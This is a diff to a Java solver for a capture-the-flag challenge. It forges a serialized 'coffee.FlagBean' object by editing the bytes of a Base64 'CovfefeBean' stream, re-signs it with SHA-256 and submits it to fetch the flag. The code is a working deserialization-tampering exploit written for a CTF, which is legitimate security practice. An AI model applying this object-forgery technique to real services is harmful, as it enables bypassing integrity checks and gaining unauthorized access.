@@ -9,6 +9,7 @@ import java.io.UnsupportedEncodingException;
 import java.io.IOException;
 import java.util.Base64;
 import java.math.BigInteger;
+import java.util.stream.*;
 
 import org.apache.http.HttpEntity;
 import org.apache.http.client.methods.CloseableHttpResponse;
@@ -171,31 +172,79 @@ public class BeanSolve {
     return null;
   }
 
+  public static byte[] hexStringToByteArray(String s) {
+    int len = s.length();
+    byte[] data = new byte[len / 2];
+    for (int i = 0; i < len; i += 2) {
+        data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
+                             + Character.digit(s.charAt(i+1), 16));
+    }
+    return data;
+  }
+
   public static String buildFlag(String hash, String name) {
     String flagHash = null;
     final byte[] hashbytes = Base64.getDecoder().decode(hash);
-    char[] hashhex = bytesToHex(hashbytes);
+    ArrayList<String> originalhash = new ArrayList<String>();
     ArrayList<String> hashhexfmt = new ArrayList<String>();
-    for (int i = 0 ; i < hashhex.length; i+=2) {
-      String s = new StringBuilder().append(hashhex[i]).append(hashhex[i+1]).toString();
-      System.out.print(s + " ");
+    int current = 0;
+    for (int i = 0; i < 6; i++) { // 0x72 TC_CLASSDESC
+      hashhexfmt.add(String.format("%02X", hashbytes[i]));
+    }
+
+    String input_classname = "coffee.CovfefeBean";
+
+    current = 6;
+
+    // Please use cofveve bean
+    hashhexfmt.add("00"); // Length of flagbean
+    hashhexfmt.add("0f");
+
+    String flagname = "coffee.FlagBean";
+    char[] hexflagname = hexString(flagname).toCharArray();
+    for (int i = 0; i < hexflagname.length; i += 2) {
+      String s = new StringBuilder().append(hexflagname[i]).append(hexflagname[i+1]).toString();
       hashhexfmt.add(s);
     }
-    int nameSizeIndex = 7;
-    System.out.println("");
-    name = "coffee." + name + "Bean";
-    String flagname = "coffee.FlagBean";
 
-    hashhexfmt.set(nameSizeIndex, hexString(flagname.length()));
-    System.out.println(hexString(name));
+    current += 2;
+    current += input_classname.length();
 
-    String out = "";
-    for (String s : hashhexfmt) {
-      System.out.print(s + " ");
+    int serialversionuid_length = 8;
+
+    hashhexfmt.add("00"); // Because the serial version is the same
+    hashhexfmt.add("00");
+    hashhexfmt.add("00");
+    hashhexfmt.add("00");
+    hashhexfmt.add("00");
+    hashhexfmt.add("00");
+    hashhexfmt.add("00");
+    hashhexfmt.add("01");
+
+    current += serialversionuid_length;
+    String asname = "Covfefe"; // -2 for pee pee - 2 for length of field
+    for (int i = current; i < hashbytes.length - asname.length() - 2 - 2; i++) {
+      hashhexfmt.add(String.format("%02X", hashbytes[i])); // Uids are identical
     }
 
-    System.out.println("");
-    return flagHash;
+    String namefieldvalue = "Flag";
+    hashhexfmt.add("00"); // Length of flagbean
+    hashhexfmt.add("04");
+    hexflagname = hexString(namefieldvalue).toCharArray();
+    for (int i = 0; i < hexflagname.length; i += 2) {
+      String s = new StringBuilder().append(hexflagname[i]).append(hexflagname[i+1]).toString();
+      hashhexfmt.add(s);
+    }
+
+    hashhexfmt.add("70"); // pee pee
+    hashhexfmt.add("70");
+    String full = "";
+    for (String s : hashhexfmt) {
+      full += s;
+
+    }
+    byte[] byteflag = hexStringToByteArray(full);
+    return new String(Base64.getEncoder().encode(byteflag));
   }
 
   public static void main(String[] args) throws UnsupportedEncodingException, IOException {
@@ -207,13 +256,11 @@ public class BeanSolve {
     String name = hashAndName[1];
     String basehash = target.split("-")[0];
 
-    buildFlag(basehash, name);
-    // Fill in hash to flag
-
+    String flagpayload = buildFlag(basehash, name);
     final String hashed = Hashing.sha256()
-          .hashString(basehash + sign, StandardCharsets.UTF_8)
+          .hashString(flagpayload + sign, StandardCharsets.UTF_8)
           .toString();
-    String result = basehash + "-" + hashed;
+    String result = flagpayload + "-" + hashed;
     submitBean(sessionId, result, "test");
     System.out.println(getFlag(sessionId, "test"));
   }
